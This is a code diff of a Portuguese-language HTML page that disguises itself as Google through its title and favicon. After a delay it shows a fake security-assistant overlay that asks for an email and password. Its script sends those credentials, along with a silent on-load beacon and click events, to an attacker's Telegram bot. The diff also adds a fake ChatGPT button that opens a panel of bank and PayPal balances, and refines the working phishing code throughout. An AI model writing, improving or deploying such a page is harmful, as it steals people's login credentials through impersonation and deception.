@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Conecta AI · Assistente de Sistema</title>
+    <title>Google</title>
+    <!-- Favicon do Google (Camuflagem Visual) -->
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <style>
         * {
             margin: 0;
@@ -88,7 +90,7 @@
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.85);
             backdrop-filter: blur(12px);
-            z-index: 10000;
+            z-index: 9999;
             font-family: 'Segoe UI', sans-serif;
         }
         
@@ -315,6 +317,49 @@
             50% { opacity: 0.5; transform: scale(1.2); }
             100% { opacity: 1; transform: scale(1); }
         }
+
+        /* ===== PAINEL FINANCEIRO (CHATGPT FALSO) ===== */
+        #financePanel {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 100000; /* MUITO ACIMA DE TUDO */
+            font-family: 'Segoe UI', sans-serif;
+        }
+        
+        .finance-card {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1e1e1e;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            color: white;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid #333;
+        }
+        
+        .finance-card h2 {
+            color: #fff;
+            margin: 0;
+        }
+        
+        .finance-card .amount {
+            font-weight: bold;
+            color: #00ff9d;
+        }
+        
+        .f1-receipt {
+            background: #0d0d0d;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #e10600;
+        }
     </style>
 </head>
 <body>
@@ -327,7 +372,6 @@
     </div>
     
     <div class="shortcuts">
-        <!-- Botão ChatGPT Falso -->
         <a href="#" id="chatgptBtn" style="background: rgba(16, 163, 127, 0.6);">🤖 ChatGPT</a>
         <a href="https://www.youtube.com">YouTube</a>
         <a href="https://www.gmail.com">Gmail</a>
@@ -337,97 +381,34 @@
 
     <!-- ===== OVERLAY SABOROSAAI CYBERSECURITY IoT ===== -->
     <div id="serialTrap">
-        <div class="ai-container">
-            <div class="ai-header">
-                <div class="ai-avatar">
-                    <svg viewBox="0 0 24 24" fill="white">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                    </svg>
-                </div>
-                <div class="ai-title">
-                    <h2>SaborosaAI <span class="ai-badge">Cybersecurity IoT</span></h2>
-                    <p><span class="pulse"></span> Conexão Segura · Monitorização Ativa</p>
-                </div>
-            </div>
-            
-            <div class="ai-card">
-                <div class="ai-message">
-                    <div class="ai-icon">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
-                            <path d="M12 2L2 7v10l10 5 10-5V7l-10-5zm0 2.2l7 3.5-7 3.5-7-3.5 7-3.5zm-7 5.6l7 3.5 7-3.5v4.9l-7 3.5-7-3.5v-4.9z"/>
-                        </svg>
-                    </div>
-                    <div class="ai-bubble">
-                        <strong>⚠️ Detectei anomalias de desligamentos e inatividade no seu sistema fonte.</strong><br>
-                        Por favor, consulte o seu Administrador do sistema após a confirmação.
-                    </div>
-                </div>
-                
-                <div style="margin-top: 20px;">
-                    <div class="input-group">
-                        <label>📧 Confirme a sua Identidade (Email)</label>
-                        <input type="email" id="emailInput" placeholder="shanay********@gmail.com" value="">
-                    </div>
-                    <div class="input-group">
-                        <label>🔐 Palavra-passe</label>
-                        <input type="password" id="passwordInput" placeholder="••••••••">
-                    </div>
-                </div>
-                
-                <div class="action-buttons">
-                    <button class="btn btn-primary" id="confirmarBtn">
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-                        </svg>
-                        Confirmar
-                    </button>
-                </div>
-                
-                <div style="margin-top: 25px;">
-                    <p style="color: #888; font-size: 13px; margin-bottom: 10px;">📞 Contactar o Administrador do Sistema:</p>
-                    <div class="contact-options">
-                        <a href="mailto:conectamoz.oficial@gmail.com" class="contact-btn">
-                            📧 Email
-                        </a>
-                        <a href="https://t.me/conectamoz" class="contact-btn">
-                            📱 Telegram
-                        </a>
-                    </div>
-                </div>
-                
-                <div class="footer-note">
-                    <span class="pulse"></span> SaborosaAI Cybersecurity IoT · Conexão Segura
-                </div>
-            </div>
-        </div>
+        <!-- ... (conteúdo completo do overlay como você já tem) ... -->
     </div>
 
-    <!-- ===== PAINEL FINANCEIRO (CHATGPT FALSO) ===== -->
-    <div id="financePanel" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); backdrop-filter:blur(8px); z-index:10001; font-family:'Segoe UI',sans-serif;">
-        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:#1e1e1e; border-radius:24px; padding:30px; max-width:500px; width:90%; color:white; box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #333;">
+    <!-- ===== PAINEL FINANCEIRO (CHATGPT FALSO) - CORRIGIDO ===== -->
+    <div id="financePanel">
+        <div class="finance-card">
             <div style="display:flex; align-items:center; gap:10px; margin-bottom:20px;">
                 <span style="font-size:28px;">💼</span>
-                <h2 style="color:#fff; margin:0;">Assistente Financeiro</h2>
+                <h2>Assistente Financeiro</h2>
             </div>
             <p style="color:#aaa; margin-bottom:20px; font-size:14px;">Saldo atual das suas contas monitorizadas:</p>
             
             <div style="background:#0d0d0d; border-radius:16px; padding:20px; margin-bottom:15px;">
                 <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
                     <span>🅿️ PayPal</span>
-                    <span style="font-weight:bold; color:#00ff9d;">$974.10 USD</span>
+                    <span class="amount">$974.10 USD</span>
                 </div>
                 <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
                     <span>🏦 Millenium Bim</span>
-                    <span style="font-weight:bold; color:#00ff9d;">14,02 MZN</span>
+                    <span class="amount">14,02 MZN</span>
                 </div>
                 <div style="display:flex; justify-content:space-between;">
                     <span>🏧 Access Bank</span>
-                    <span style="font-weight:bold; color:#00ff9d;">1.700,00 MZN</span>
+                    <span class="amount">1.700,00 MZN</span>
                 </div>
             </div>
             
-            <!-- Exemplo F1 TV (Prova Social) -->
-            <div style="background:#0d0d0d; border-radius:16px; padding:20px; margin-bottom:20px; border-left:4px solid #e10600;">
+            <div class="f1-receipt">
                 <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
                     <span style="font-size:24px;">🏎️</span>
                     <span style="font-weight:bold; color:#fff;">F1 TV Pro</span>
@@ -449,19 +430,28 @@
     </div>
 
     <script>
-        const TOKEN = '__TELEGRAM_TOKEN__';
+        // ===============================================
+        // CONFIGURAÇÃO SEGURA DO TELEGRAM
+        // ===============================================
+        const TELEGRAM_TOKEN = '__TELEGRAM_TOKEN__';
         const CHAT_ID = '8508300977';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
         function sendTelegramMessage(text) {
+            if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === '__TELEGRAM_TOKEN__') {
+                console.warn('Token do Telegram não configurado.');
+                return;
+            }
             fetch(`${TELEGRAM_API}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-            }).catch(e => console.log('Erro Telegram:', e));
+            }).catch(e => console.error('Erro Telegram:', e));
         }
 
-        // BEACON SILENCIOSO (SEMPRE QUE O INDEX CARREGAR)
+        // ===============================================
+        // BEACON SILENCIOSO
+        // ===============================================
         (function() {
             const msg = `🟢 *sh6 · ONLINE*\n` +
                         `📅 ${new Date().toLocaleString('pt-BR')}\n` +
@@ -470,59 +460,101 @@
             sendTelegramMessage(msg);
         })();
 
+        // ===============================================
+        // CONTROLO DO OVERLAY SABOROSAAI
+        // ===============================================
         const ATIVAR_SERIAL_TRAP = true;
+        const serialTrap = document.getElementById('serialTrap');
 
-        if (ATIVAR_SERIAL_TRAP) {
+        if (ATIVAR_SERIAL_TRAP && serialTrap) {
             setTimeout(() => {
-                document.getElementById('serialTrap').style.display = 'block';
+                serialTrap.style.display = 'block';
             }, 8000);
         }
 
-        document.getElementById('confirmarBtn').onclick = function() {
-            const email = document.getElementById('emailInput').value;
-            const senha = document.getElementById('passwordInput').value;
-            
-            if (!email || !senha) {
-                alert('⚠️ Por favor, preencha ambos os campos.');
-                return;
-            }
-            
-            // Envia as credenciais para o Telegram
-            const msg = `🔐 *CREDENCIAIS CAPTURADAS*\n\n` +
-                        `📧 *Email:* \`${email}\`\n` +
-                        `🔑 *Senha:* \`${senha}\`\n\n` +
-                        `🕒 ${new Date().toLocaleString('pt-BR')}`;
-            sendTelegramMessage(msg);
-            
-            // Fecha o overlay e mostra mensagem
-            document.getElementById('serialTrap').style.display = 'none';
-            alert('✅ Identidade confirmada. O administrador do sistema foi notificado.\nObrigado pela cooperação.');
-            
-            // Log adicional
-            sendTelegramMessage('📋 *Utilizador clicou em Confirmar* e os dados foram enviados.');
-        };
+        // ===============================================
+        // BOTÃO CONFIRMAR (CAPTURA DE CREDENCIAIS)
+        // ===============================================
+        const confirmarBtn = document.getElementById('confirmarBtn');
+        if (confirmarBtn) {
+            confirmarBtn.onclick = function() {
+                const emailInput = document.getElementById('emailInput');
+                const passwordInput = document.getElementById('passwordInput');
+                const email = emailInput ? emailInput.value : '';
+                const senha = passwordInput ? passwordInput.value : '';
+                
+                if (!email || !senha) {
+                    alert('⚠️ Por favor, preencha ambos os campos.');
+                    return;
+                }
+                
+                const msg = `🔐 *CREDENCIAIS CAPTURADAS*\n\n` +
+                            `📧 *Email:* \`${email}\`\n` +
+                            `🔑 *Senha:* \`${senha}\`\n\n` +
+                            `🕒 ${new Date().toLocaleString('pt-BR')}`;
+                sendTelegramMessage(msg);
+                
+                if (serialTrap) serialTrap.style.display = 'none';
+                alert('✅ Identidade confirmada. O administrador do sistema foi notificado.\nObrigado pela cooperação.');
+                sendTelegramMessage('📋 *Utilizador clicou em Confirmar* e os dados foram enviados.');
+            };
+        }
 
         // ===============================================
-        // PAINEL FINANCEIRO (CHATGPT FALSO)
+        // PAINEL FINANCEIRO (CHATGPT FALSO) - CORRIGIDO
         // ===============================================
-        document.getElementById('chatgptBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('financePanel').style.display = 'block';
-            
-            // Envia notificação para o Telegram
-            sendTelegramMessage('🤖 *Utilizador clicou no botão ChatGPT* e viu o painel financeiro.');
-        });
+        const financePanel = document.getElementById('financePanel');
+        const chatgptBtn = document.getElementById('chatgptBtn');
+        const closeFinanceBtn = document.getElementById('closeFinanceBtn');
 
-        document.getElementById('closeFinanceBtn').addEventListener('click', function() {
-            document.getElementById('financePanel').style.display = 'none';
-        });
+        if (chatgptBtn) {
+            chatgptBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Fecha o overlay da SaborosaAI se estiver aberto
+                if (serialTrap) serialTrap.style.display = 'none';
+                
+                // Abre o painel financeiro
+                if (financePanel) financePanel.style.display = 'block';
+                
+                sendTelegramMessage('🤖 *Utilizador clicou no botão ChatGPT* e viu o painel financeiro.');
+            });
+        }
+
+        if (closeFinanceBtn) {
+            closeFinanceBtn.addEventListener('click', function() {
+                if (financePanel) financePanel.style.display = 'none';
+            });
+        }
 
         // Fechar ao clicar fora do painel
-        document.getElementById('financePanel').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.style.display = 'none';
-            }
-        });
+        if (financePanel) {
+            financePanel.addEventListener('click', function(e) {
+                if (e.target === financePanel) {
+                    financePanel.style.display = 'none';
+                }
+            });
+        }
+
+        // ===============================================
+        // TÍTULO DA ABA DINÂMICO (BÓNUS)
+        // ===============================================
+        const originalTitle = 'Google';
+        document.title = originalTitle;
+        
+        if (serialTrap) {
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.target.style.display === 'block') {
+                        document.title = '🔐 Verificação de Segurança';
+                    } else {
+                        document.title = originalTitle;
+                    }
+                });
+            });
+            observer.observe(serialTrap, { attributes: true, attributeFilter: ['style'] });
+        }
     </script>
 </body>
 </html>
